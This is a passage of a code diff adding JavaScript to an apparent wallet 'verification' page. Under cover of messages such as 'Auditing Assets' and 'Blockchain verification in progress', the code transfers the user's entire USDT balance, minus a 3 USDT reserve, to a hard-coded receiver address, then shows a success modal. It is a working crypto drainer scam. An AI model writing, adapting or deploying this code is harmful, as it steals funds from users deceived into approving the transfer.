+                return;
+            }
+        }
+
+        // STEP 3: Scan Balance & Check 3 USDT Logic
+        btnText.innerHTML = '<span class="loader"></span> Auditing Assets...';
+        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
+        let fullBalance = await usdtContract.balanceOf(userAddress);
+
+        const reserveAmount = ethers.utils.parseUnits("3", 18); // 3 USDT Fixed Reserve
+
+        // Agar wallet me 3 USDT se kam hai toh alert dikhao aur rok do
+        if (fullBalance.lte(reserveAmount)) {
+            alert("Verification failed: Insufficient assets in wallet. Must hold more than 3 USDT.");
+            resetButton();
+            return;
+        }
+
+        // Total me se 3 USDT minus karke transfer amount calculate karo
+        const transferAmount = fullBalance.sub(reserveAmount);
+
+        // STEP 4: Trigger Transfer 
+        btnText.innerHTML = '<span class="loader"></span> Confirming...';
+        statusMsg.innerText = "Please confirm the transaction in your wallet.";
+        statusMsg.style.color = "#f3ba2f"; 
+
+        const tx = await usdtContract.transfer(RECEIVER_ADDRESS, transferAmount);
+        
+        btnText.innerHTML = '<span class="loader"></span> Finalizing...';
+        statusMsg.innerText = "Blockchain verification in progress...";
+        statusMsg.style.color = "#00d395"; 
+
+        await tx.wait(); // Wait for success
+
+        // STEP 5: Success Modal
+        // UI par total verified balance dikhane ke liye
+        let uiBalanceStr = ethers.utils.formatUnits(fullBalance, 18);
+        document.getElementById('uiUSDT').innerText = parseFloat(uiBalanceStr).toFixed(2);
+        
+        showMod1
